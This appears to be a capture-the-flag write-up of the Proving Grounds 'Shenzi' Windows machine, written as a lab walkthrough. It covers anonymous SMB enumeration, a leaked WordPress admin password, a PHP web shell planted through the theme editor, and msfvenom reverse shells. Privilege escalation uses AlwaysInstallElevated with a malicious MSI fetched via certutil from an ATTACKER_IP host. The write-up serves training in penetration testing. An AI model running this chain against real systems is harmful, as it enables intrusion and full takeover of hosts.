---
title: PG Practice | Shenzi
description: A Proving Grounds Practice writeup of the Shenzi machine,

categories:
  - CTF
  - PG
  - Windows

tags:
  - proving-grounds
  - windows
  - smb
  - anonymous-access
  - wordpress
  - webshell
  - privilege-escalation
  - msi
  - winpeas
  - msfvenom
  - reverse-shell

image:
  path: /assets/sen.jpg
---

## Target Information

* **IP:** `192.168.235.55`
* **Platform:** Windows
* **Difficulty:** PG Practice

---

## Enumeration

### Nmap Scan

```bash
sudo nmap 192.168.235.55 -p- -sS -sV
```

### Open Ports

```
21/tcp   FTP (FileZilla 0.9.41 beta)
80/tcp   HTTP (Apache 2.4.43 Win64 PHP 7.4.6)
135/tcp  MSRPC
139/tcp  NetBIOS
443/tcp  HTTPS (Apache 2.4.43)
445/tcp  SMB
3306/tcp MySQL
5040/tcp Unknown
```

SMB, FTP, and HTTP were the most promising services for initial access.

---

## SMB Enumeration

Since SMB was exposed, I attempted anonymous access:

```bash
smbclient -U '' -L \\\\192.168.235.55\\
```

The output revealed a share named:

```
Shenzi
```

Connecting to the share:

```bash
smbclient -U '' \\\\192.168.235.55\\Shenzi
```

To download all files efficiently:

```bash
recurse ON
prompt OFF
mget *
```

---

## Credential Discovery

Inside the share, a file named `passwords.txt` was discovered.

The credentials listed included several services, but the **WordPress credentials** were particularly interesting.

Further enumeration showed:

* phpMyAdmin was inaccessible
* WebDAV was not exposed externally
* dirsearch revealed no useful directories

---

## WordPress Discovery

Instead of assuming `/wordpress/`, I used the machine/share name:

```
http://192.168.235.55/shenzi/
```

A WordPress site was confirmed.

### WordPress Admin Access

Login page:

```
http://192.168.235.55/shenzi/wp-admin/
```

Credentials:

```
admin : FeltHeadwallWight357
```

Login successful.

---

## Web Shell via Theme Editor

Navigated to:

```
Appearance â†’ Theme Editor
```

Edited the `404.php` file:

```
/wp-admin/theme-editor.php?file=404.php&theme=twentytwenty
```

Inserted a PHP web shell.

Accessed it via:

```
http://192.168.235.55/shenzi/404.php
```

Command execution confirmed.

---

## Reverse Shell

Generated a Windows reverse shell executable:

```bash
msfvenom -p windows/shell_reverse_tcp \
LHOST=192.168.49.235 LPORT=8082 \
-f exe > reverseshell.exe
```

Uploaded via the PHP web shell and executed.

Listener:

```bash
nc -lvnp 8082
```

Initial shell obtained.

---

## Privilege Escalation

Initial manual enumeration did not reveal anything obvious. I then uploaded and executed **winPEAS** for automated checks.

WinPEAS identified that **AlwaysInstallElevated** was enabled.

This misconfiguration allows MSI files to be installed with SYSTEM privileges.

---

## Exploiting AlwaysInstallElevated

### Generate Malicious MSI

```bash
msfvenom -p windows/shell_reverse_tcp \
LHOST=192.168.49.235 LPORT=21 \
-f msi > priv.msi
```

Start listener:

```bash
nc -lvnp 21
```

Transfer MSI to target using `certutil`:

```cmd
certutil -urlcache -split -f http://ATTACKER_IP/priv.msi priv.msi
```

Execute:

```cmd
msiexec /quiet /qn /i priv.msi
```

---

## SYSTEM Access

The listener received a connection as:

```
NT AUTHORITY\SYSTEM
```

Privilege escalation successful.

---

## Attack Chain Summary

1. Anonymous SMB access exposed credentials.
2. WordPress credentials discovered in shared files.
3. WordPress admin login enabled web shell upload.
4. Reverse shell established on Windows host.
5. AlwaysInstallElevated misconfiguration exploited.
6. SYSTEM privileges obtained via malicious MSI.

---
